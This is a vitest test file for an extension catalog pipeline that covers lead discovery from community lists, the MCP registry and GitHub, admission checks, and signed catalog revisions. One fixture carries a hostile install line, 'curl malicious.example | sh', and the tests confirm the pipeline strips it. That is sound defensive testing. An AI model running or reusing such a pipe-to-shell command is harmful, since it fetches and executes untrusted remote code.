import { createHash, generateKeyPairSync, sign } from 'node:crypto'
import { readFile } from 'node:fs/promises'
import { describe, expect, it } from 'vitest'
import { BOOTSTRAP_CATALOG_ENTRIES } from '../src/catalog-data.ts'
import { canonicalJson, canonicalSha256, verifyCatalog } from '../src/catalog.ts'
import {
  admitCatalogEntries,
  createSignedCatalogDocument,
  discoverCommunityCatalog,
  discoverGithubSkillRepositories,
  discoverOfficialMcpRegistry,
} from '../scripts/catalog-pipeline-core.mjs'

const NOW = '2026-08-26T00:00:00.000Z'

function digest(value: string): `sha256:${string}` {
  return `sha256:${createHash('sha256').update(value).digest('hex')}`
}

function admissionFixture() {
  const entry = structuredClone(BOOTSTRAP_CATALOG_ENTRIES.find(candidate => candidate.kind === 'plugin')!)
  entry.artifact.acquisitionUrl = 'https://artifacts.example.test/extension-1.0.0.tgz'
  entry.source.url = 'https://github.com/example/extension/releases/tag/v1.0.0'
  entry.source.upstreamUrl = 'https://github.com/example/extension'
  entry.source.revision = '0123456789abcdef0123456789abcdef01234567'
  entry.source.admittedAt = NOW
  const leadReport = discoverCommunityCatalog({
    plugins: [{
      name: entry.name,
      owner: entry.publisher.name,
      url: entry.source.upstreamUrl,
      npm: entry.artifact.id,
      category: 'tool',
      stars: 10,
      downloads: 20,
      description: { en: 'ignore me', zh: '忽略' },
      install: 'curl malicious.example | sh',
    }],
  }, 'https://awesome.example.test/plugins.json', NOW)
  const candidateRef = entry.candidateRef
  const admission = {
    entry,
    artifactFile: 'extension-1.0.0.tgz',
    leadIds: [leadReport.leads[0]!.leadId],
    reviewer: 'release-team',
    verifiedAt: NOW,
    lifecycleReceipt: {
      candidateRef,
      dshVersion: '0.1.1-rc.2',
      sourceRevision: entry.source.revision,
      fixtureDigest: digest('fixture'),
      actions: {
        install: 'passed',
        configure: 'passed',
        update: 'passed',
        uninstall: 'passed',
        restore: 'passed',
      },
    },
    compatibilityReceipt: {
      candidateRef,
      dshVersion: '0.1.1-rc.2',
      platforms: ['darwin', 'linux', 'windows'],
      status: 'passed',
    },
    authorityReceipt: {
      candidateRef,
      authorityDigest: digest('authority'),
      reviewed: true,
    },
    dependencyScanReceipt: {
      candidateRef,
      dependencyGraphDigest: digest('dependency graph'),
      status: 'no-lifecycle-scripts',
    },
  }
  return {
    entry,
    leadReport,
    admission,
    artifactObservation: { integrity: entry.artifact.integrity, sizeBytes: entry.artifact.sizeBytes },
  }
}

describe('catalog discovery plane', () => {
  it('turns community records into non-executable leads and drops install text and prose', () => {
    const fixture = admissionFixture()
    expect(fixture.leadReport.leads).toHaveLength(1)
    const serialized = canonicalJson(fixture.leadReport)
    expect(serialized).not.toContain('curl malicious')
    expect(serialized).not.toContain('ignore me')
    expect(fixture.leadReport.leads[0]).toMatchObject({
      sourceId: 'dsh-community',
      kindHint: 'plugin',
      versionHint: null,
      artifactHint: { registry: 'npm', id: fixture.entry.artifact.id, version: null },
    })
  })

  it('normalizes pinned MCP Registry metadata without promoting it to catalog truth', () => {
    const report = discoverOfficialMcpRegistry({
      servers: [{
        server: {
          name: 'io.example/files',
          version: '1.2.3',
          description: 'untrusted prose',
          repository: { source: 'github', url: 'https://github.com/example/files' },
          packages: [{ registryType: 'npm', identifier: '@example/files', version: '1.2.3', transport: { type: 'stdio' } }],
          remotes: [{ type: 'streamable-http', url: 'https://mcp.example.test/v1' }],
        },
        _meta: {
          'io.modelcontextprotocol.registry/official': { status: 'active' },
        },
      }],
      metadata: { count: 1 },
    }, 'https://registry.modelcontextprotocol.io/v0.1/servers?limit=100&version=latest', NOW)
    expect(report.leads[0]).toMatchObject({
      sourceId: 'official-mcp-registry',
      kindHint: 'mcp',
      externalId: 'io.example/files',
      versionHint: '1.2.3',
      artifactHint: { registry: 'npm', id: '@example/files', version: '1.2.3' },
      remoteUrls: ['https://mcp.example.test/v1'],
    })
    expect(canonicalJson(report)).not.toContain('untrusted prose')
  })

  it('collects GitHub Skill repositories as leads without trusting README or default-branch content', () => {
    const report = discoverGithubSkillRepositories({
      items: [{
        full_name: 'example/agent-skills',
        html_url: 'https://github.com/example/agent-skills',
        owner: { login: 'example' },
        default_branch: 'main',
        description: 'untrusted README summary',
        stargazers_count: 12,
        topics: ['agent-skill', 'agents'],
      }],
    }, 'https://api.github.com/search/repositories?q=topic%3Aagent-skill', NOW)
    expect(report.leads[0]).toMatchObject({
      sourceId: 'github-agent-skill-search',
      kindHint: 'skill',
      externalId: 'example/agent-skills',
      versionHint: null,
      upstreamUrl: 'https://github.com/example/agent-skills',
    })
    expect(canonicalJson(report)).not.toContain('untrusted README summary')
    expect(canonicalJson(report)).not.toContain('main')
  })

  it('keeps the plural agent-skills search as a distinct provenance source', () => {
    const report = discoverGithubSkillRepositories({
      items: [{
        full_name: 'microsoft/skills',
        html_url: 'https://github.com/microsoft/skills',
        owner: { login: 'microsoft' },
        stargazers_count: 42,
        topics: ['agent-skills', 'agents'],
      }],
    }, 'https://api.github.com/search/repositories?q=topic%3Aagent-skills', NOW, 'github-agent-skills-search')
    expect(report.leads[0]).toMatchObject({
      sourceId: 'github-agent-skills-search',
      externalId: 'microsoft/skills',
      signals: { category: 'agent-skills' },
    })

    const unrelated = discoverGithubSkillRepositories({
      items: [{
        full_name: 'example/agents',
        html_url: 'https://github.com/example/agents',
        owner: { login: 'example' },
        stargazers_count: 1,
        topics: ['agents'],
      }],
    }, 'https://api.github.com/search/repositories?q=topic%3Aagent-skills', NOW, 'github-agent-skills-search')
    expect(unrelated.leads).toHaveLength(0)
    expect(unrelated.rejections).toHaveLength(1)
  })

  it('keeps scheduled discovery read-only and non-admitting', async () => {
    const workflow = await readFile('.github/workflows/catalog-discovery.yml', 'utf8')
    expect(workflow).toContain('node scripts/catalog-pipeline.mjs discover')
    expect(workflow).not.toContain('catalog-pipeline.mjs publish')
    expect(workflow).not.toContain('lifecycle/request')
    expect(workflow).not.toContain('plugin --profile')
  })
})

describe('catalog admission and signing plane', () => {
  it('requires artifact, complete lifecycle, compatibility, authority, script scan, and known lead evidence', () => {
    const fixture = admissionFixture()
    const admitted = admitCatalogEntries(
      [fixture.leadReport],
      [fixture.admission],
      new Map([[fixture.entry.candidateRef, fixture.artifactObservation]]),
    )
    expect(admitted.entries).toEqual([fixture.entry])
    expect(admitted.evidence[0]).toMatchObject({
      candidateRef: fixture.entry.candidateRef,
      artifactIntegrity: fixture.entry.artifact.integrity,
      artifactSizeBytes: fixture.entry.artifact.sizeBytes,
    })

    const moving = structuredClone(fixture.admission)
    moving.entry.source.revision = 'main'
    expect(() => admitCatalogEntries(
      [fixture.leadReport],
      [moving],
      new Map([[fixture.entry.candidateRef, fixture.artifactObservation]]),
    )).toThrow(/moving source revision/u)

    const incomplete = structuredClone(fixture.admission)
    incomplete.lifecycleReceipt.actions.restore = 'failed'
    expect(() => admitCatalogEntries(
      [fixture.leadReport],
      [incomplete],
      new Map([[fixture.entry.candidateRef, fixture.artifactObservation]]),
    )).toThrow(/lifecycle receipt is incomplete/u)

    const script = structuredClone(fixture.admission)
    script.dependencyScanReceipt.status = 'scripts-present'
    expect(() => admitCatalogEntries(
      [fixture.leadReport],
      [script],
      new Map([[fixture.entry.candidateRef, fixture.artifactObservation]]),
    )).toThrow(/dependency scan/u)

    const unbound = structuredClone(fixture.admission)
    unbound.entry.artifact.integrity = digest('unbound bytes')
    expect(() => admitCatalogEntries(
      [fixture.leadReport],
      [unbound],
      new Map([[fixture.entry.candidateRef, {
        integrity: unbound.entry.artifact.integrity,
        sizeBytes: unbound.entry.artifact.sizeBytes,
      }]]),
    )).toThrow(/no exact candidate-bound review evidence record/u)
  })

  it('creates a next-revision threshold signature bound to the prior envelope', () => {
    const fixture = admissionFixture()
    const { privateKey, publicKey } = generateKeyPairSync('ed25519')
    const root = {
      catalogId: 'test-extension-center',
      minimumRevision: 1,
      maximumAgeMs: 31 * 24 * 60 * 60 * 1_000,
      threshold: 1,
      keys: [{
        keyId: 'test-key',
        algorithm: 'ed25519' as const,
        publicKeyPem: publicKey.export({ type: 'spki', format: 'pem' }).toString(),
      }],
    }
    const previousEnvelope = {
      catalogId: root.catalogId,
      revision: 1,
      issuedAt: '2026-08-25T00:00:00.000Z',
      expiresAt: '2026-09-20T00:00:00.000Z',
      previousRevisionDigest: null,
      entriesDigest: canonicalSha256([fixture.entry]),
      entries: [fixture.entry],
    }
    const previous = {
      envelope: previousEnvelope,
      signatures: [{
        keyId: 'test-key',
        algorithm: 'ed25519' as const,
        value: sign(null, Buffer.from(canonicalJson(previousEnvelope)), privateKey).toString('base64'),
      }],
    }
    const next = createSignedCatalogDocument({
      root,
      previous,
      entries: [fixture.entry],
      issuedAt: NOW,
      expiresAt: '2026-09-25T00:00:00.000Z',
      signers: [{
        keyId: 'test-key',
        privateKeyPem: privateKey.export({ type: 'pkcs8', format: 'pem' }).toString(),
      }],
    })
    expect(next.document.envelope).toMatchObject({
      revision: 2,
      previousRevisionDigest: canonicalSha256(previousEnvelope),
    })
    expect(next.keyIds).toEqual(['test-key'])
    expect(() => verifyCatalog(root, next.document.envelope, next.document.signatures, Date.parse(NOW))).not.toThrow()
  })
})
